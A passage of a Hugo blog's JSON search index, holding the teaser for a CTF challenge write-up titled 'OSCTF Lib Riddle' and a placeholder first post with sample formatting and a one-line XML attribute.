stacks. In this hilarious and intriguing challenge, you\u0026rsquo;ll sift through piles of books and quirky clues to uncover the hidden mystery. Can you crack the code and reveal the library\u0026rsquo;s best-kept secret? Dive in and let the quest for knowledge begin!\u003c/p\u003e","title":"OSCTF Lib Riddle [PWN]"},{"content":"Introduction This is bold text, and this is emphasized text.\nVisit the Hugo website!\nTargetMode=\u0026#34;External\u0026#34; asdad ","permalink":"http://localhost:1313/posts/my-first-post/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eThis is \u003cstrong\u003ebold\u003c/strong\u003e text, and this is \u003cem\u003eemphasized\u003c/em\u003e text.\u003c/p\u003e\n\u003cp\u003eVisit the \u003ca href=\"https://gohugo.io\"\u003eHugo\u003c/a\u003e website!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eTargetMode=\u0026#34;External\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003easdad\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"My First Post"}]